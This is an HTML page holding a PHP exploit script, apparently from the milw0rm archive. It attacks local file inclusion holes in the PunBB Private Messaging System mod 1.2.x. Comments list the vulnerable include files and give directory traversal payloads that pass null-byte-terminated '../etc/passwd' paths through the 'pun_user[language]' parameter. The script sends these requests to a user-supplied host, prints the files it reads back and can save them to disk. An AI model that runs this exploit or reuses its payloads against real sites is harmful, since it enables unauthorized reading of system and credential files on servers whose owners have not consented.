<html><head><title>PunBB (Private Messaging System 1.2.x) Multiple LFI Exploit</title></head><pre>&lt;?php

error_reporting(0);
ini_set(&quot;default_socket_timeout&quot;,5);




/*
   
   
    PunBB (Private Messaging System 1.2.x) Multiple LFI Exploit
    -----------------------------------------------------------
    by athos - staker[at]hotmail[dot]it
    download mod http://www.punres.org/files.php?pid=52
    download cms http://punbb.org
    -----------------------------------------------------------
    register_globals = 1
    magic_quotes_gpc = 1
    
    Directory (files/include/pms)

    functions_navlinks.php?pun_user[language]=../../../../../etc/passwd
    profile_send.php?pun_user[language]=../../../../../etc/passwd
    viewtopic_PM-link.php?pun_user[language]=../../../../../etc/passwd

    ../../etc/passwd and nullbyte
    


    File (files/include/pms/functions_navlinks.php)
    
    1. &lt;?php
    2. 	require PUN_ROOT.'lang/'.$pun_user['language'].'/pms.php';
    
    $pun_user['language'] isn't declared :D you can include any file
    
    functions_navlinks.php?pun_user[language]=../../../etc/passwd%00
    -------------------------------------------------------------------
    
    File (files/include/pms/header_new_messages.php)
    
    1. &lt;?php
    2. if(!$pun_user['is_guest'] &amp;&amp; $pun_user['g_pm'] == 1 &amp;&amp; $pun_config['o_pms_enabled'] ){
    3. require PUN_ROOT.'lang/'.$pun_user['language'].'/pms.php';
    
    $pun_user['g_pm'] isn't declared
    $pun_config['o_pms_enabled'] isn't declared
    
    header_new_messages.php?pun_user[g_pm]=1&amp;pun_config[o_pms_enabled]=x&amp;pun_user[language]=../etc/passd%00
    
    
    -------------------------------------------------------------------
    
    File (files/include/pms/profile_send.php))
    
    1. &lt;?php
    2. require PUN_ROOT.'lang/'.$pun_user['language'].'/pms.php';
    
    $pun_user['language'] isn't declared
    
    profile_send.php?pun_user[language]=../../../../etc/passwd%00
    
    -------------------------------------------------------------------
    
    File (files/include/pms/viewtopic_PM-link.php)
    
    1. &lt;?php
    2. require PUN_ROOT.'lang/'.$pun_user['language'].'/pms.php';
    
    $pun_user['language'] isn't declared
    
    viewtopic_PM-link.php?pun_user[language]=../../../../etc/passwd%00
    
    -------------------------------------------------------------------
    
    
    Usage:  php [punbb.php] [host/path] [mode]
            php [punbb.php] [host/path] [save]
            php [punbb.php] [host/path] [NULL]
           
   Example:
            php punbb.php localhost/punbb save
            php punbb.php localhost/punbb
          
                   
    NOTE: Don't add me on MSN Messenger

    
    
*/    

$exploit = new Exploit;
$domain = $argv[1];
$mymode = $argv[2];

$exploit-&gt;starting();
$exploit-&gt;is_vulnerable($domain);
$exploit-&gt;exploiting($domain,$mymode);

 

class Exploit
{
  
  function http_request($host,$data) 
  {   
   
    if(!$socket = socket_create(AF_INET,SOCK_STREAM,SOL_TCP)) 
    {
       echo &quot;socket_create() error!\r\n&quot;;
       exit;
    }
    if(!socket_set_option($socket,SOL_SOCKET,SO_BROADCAST,1))
    { 
      echo &quot;socket_set_option() error!\r\n&quot;;
      exit;
    }
    
    if(!socket_connect($socket,$host,80))
    {
      echo &quot;socket_connect() error!\r\n&quot;;
      exit;
    }
    if(!socket_write($socket,$data,strlen($data)))
    {
      echo &quot;socket_write() errror!\r\n&quot;;
      exit;
    }
  
    while($get = socket_read($socket,1024,PHP_NORMAL_READ)) 
    { 
      $content .= $get; 
    }

    socket_close($socket);
  
   
   $array = array(
                 'HTTP/1.1 404 Not Found',
                 'HTTP/1.1 300 Multiple Choices',
                 'HTTP/1.1 301 Moved Permanently',
                 'HTTP/1.1 302 Found',
                 'HTTP/1.1 304 Not Modified',
                 'HTTP/1.1 400 Bad Request',
                 'HTTP/1.1 401 Unauthorized',
                 'HTTP/1.1 402 Payment Required',
                 'HTTP/1.1 403 Forbidden',
                 'HTTP/1.1 405 Method Not Allowed',
                 'HTTP/1.1 406 Not Acceptable',
                 'HTTP/1.1 407 Proxy Authentication Required',
                 'HTTP/1.1 408 Request Timeout',
                 'HTTP/1.1 409 Conflict',
                 'HTTP/1.1 410 Gone',
                 'HTTP/1.1 411 Length Required',
                 'HTTP/1.1 412 Precondition Failed',
                 'HTTP/1.1 413 Request Entity Too Large',
                 'HTTP/1.1 414 Request-URI Too Long',
                 'HTTP/1.1 415 Unsupported Media Type',
                 'HTTP/1.1 416 Request Range Not Satisfiable',
                 'HTTP/1.1 417 Expectation Failed',
                 'HTTP/1.1 Retry With',
                );
                
               
    for($i=0;$i&lt;=count($array);$i++)
   
    if(eregi($array[$i],$content)) 
    {
      return (&quot;$array[$i]\r\n&quot;);
      break;
    } 
    else 
    {
      return (&quot;$content\r\n&quot;);
      break;
    }
  }
     
  
  function is_vulnerable($host)
  {
    $host = explode('/',$host);
    
    $header .= &quot;GET /$host[1]/profile_send.php?pun_user[language]=%27 HTTP/1.1\r\n&quot;;
    $header .= &quot;Host: $host[0]\r\n&quot;;
    $header .= &quot;User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n&quot;;
    $header .= &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;;
    $header .= &quot;Accept-Language: en-us,en;q=0.5\r\n&quot;;
    $header .= &quot;Accept-Encoding: gzip,deflate\r\n&quot;;
    $header .= &quot;Connection: close\r\n\r\n&quot;;
    
    if(stristr($this-&gt;http_request($host[0],$header),&quot;\\'&quot;))
    {  
      echo &quot;[+] Magic Quotes GPC/Register Globals On!\n&quot;;
      echo &quot;[+] Exploit Failed!\n&quot;;
      exit;
    }
    else
    {
      return false;
    }
  }
  
  function starting()
  {
   
    global $argv;
    
    if(preg_match('/http://(.+?)$/',$argv[1]) or empty($argv[1]))
    {
    
      echo &quot;[+] PunBB (Private Messaging System 1.2.x) Multiple LFI Exploit\r\n&quot;;
      echo &quot;[+] by athos - staker[at]hotmail[dot]it\r\n&quot;;
      echo &quot;    -----------------------------------------------------------\r\n&quot;;
      echo &quot;[+] Usage: php $argv[0] [host/path] [mode]\r\n&quot;;
      echo &quot;[+] Usage: php $argv[0] [host/path] [save]\r\n&quot;;
      echo &quot;[+] Usage: php $argv[0] [host/path]        \r\n&quot;;
      exit;
    
    }
  }
  
  function exploiting($host,$mode)
  {
    
    $host = explode('/',$host);
    $i = 0;
    
    
    echo &quot;[+] Local File (ex: ../../etc/passwd%00)\r\n&quot;;
    echo &quot;[+] Local File: &quot;;
    
    $file = stripslashes(trim(fgets(STDIN)));
    
    if(empty($file)) die(&quot;you fail&quot;);
    
    
    $array = array (
                    &quot;functions_navlinks.php?pun_user[language]=$file&quot;,
                    &quot;profile_send.php?pun_user[language]=$file&quot;,
                    &quot;viewtopic_PM-link.php?pun_user[language]=$file&quot;,
                    &quot;header_new_messages.php?pun_user[g_pm]=1&amp;pun_config[o_pms_enabled]=x&amp;pun_user[language]=$file&quot;,
                  ); 

    $write .= &quot;GET /$host[1]/files/include/pms/$array[$i] HTTP/1.1\r\n&quot;;
    $write .= &quot;Host: $host[0]\r\n&quot;;
    $write .= &quot;User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n&quot;;
    $write .= &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;;
    $write .= &quot;Accept-Language: en-us,en;q=0.5\r\n&quot;;
    $write .= &quot;Accept-Encoding: gzip,deflate\r\n&quot;;
    $write .= &quot;Connection: close\r\n\r\n&quot;;
    

   
    
    if(stristr($this-&gt;http_request($host[0],$write),'No such file or directory in'))
    {
      $i++;
    }
    else
    {
      if($mode == &quot;save&quot;) 
      {
   
        $rand = rand(0,99999);
        fclose(fwrite(fopen(getcwd().'/'.$rand.'.txt',&quot;a+&quot;),$this-&gt;http_request($host[0],$write)));
        
        echo &quot;[+] File $rand Saved Successfully!\r\n&quot;;
        echo &quot;[+] Exploit Terminated!\r\n&quot;;
        exit;
      
      }
      else
      {
        echo $this-&gt;http_request($host[0],$write);
        exit;
      }
    }
  }
}

# milw0rm.com [2008-11-19]</pre></html>